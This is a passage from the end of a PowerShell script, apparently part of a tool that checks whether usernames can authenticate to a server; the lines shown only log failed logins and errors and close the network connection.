                            Write-Verbose "[!] $Username failed to authenticate on $Server"
                        }
                    }
                }
                catch {
                    Write-Output "[-] $($_.Exception.Message)"
                }
            }
            $client.Close()
            $client_stream.Close()
        }
    }
}
